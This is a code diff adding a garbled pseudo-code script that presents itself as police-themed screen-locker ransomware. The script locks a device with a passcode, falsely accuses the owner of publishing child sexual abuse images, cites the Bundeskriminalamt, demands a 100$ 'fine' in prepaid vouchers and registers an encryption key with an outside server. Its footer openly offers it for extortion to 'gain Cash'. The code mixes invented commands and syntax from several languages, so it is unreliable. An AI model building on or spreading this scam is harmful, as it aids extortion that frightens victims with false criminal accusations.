@@ -1,0 +1,40 @@
+function OnGet( $get )
+{
+	app.screencast();
+	app.screenDelay();
+	app.ShowPopup( "Your Device has been locked up for safety reason" );
+}
+
+function OnAndro( $Andro )
+{
+	set.Invisibility( 1 );
+	set.DisplayTimeOut( 100 );
+}
+:lockingkey_2242
+$get delay info ( var=1 )
+$get power off ( var=2 )
+$Andro Lock ScreenImage set Passcode = 5475748
+$Andro Lock Screen Rotator set Passcode = 5475748
+$Andro + $get Set 0
+Del log.txt > /sys/prog/conf/security/Meterpreter/log.txt
+
+Generate Text Image = Your Device has beel blocked up for safety Reason!
+Generate Text Session = You have downloaded illegal child Pornography Image and published this on your Blog.
+Generate Text Preter = TextBox + SetOff = Pay fine off 100$ to Unlock your Device 
+Generate Image = Paysafecard.png.cryp + Ukash.png.cryp + MoneyPak.png.cryp 
+Set Key + wong.org + Device_Id = EncryptKey 
+Set On Active Recive EncryptKey
+Do Del Short; Long; Express!
+Set Meterpreter = 5 Do Del 0
+If false Higher than 100 do express Checkout
+If true Lower than 100 do back to lockingkey_2242
+Tellow Box + XXX = This Is a Caller to bundeskriminalamt $get XXX /.com XXX /.co.uk 
+
+:Caller_Crawl
+<li>Script Made by anyspot</li>
+<li>Da Rules</li>
+<li>Use this script to troll other People and gain Cash !</li>
+<li>You must have a own webserver replace it with wong.org</li>
+<li>customer@malwareonlinevir.com</li>
+
+
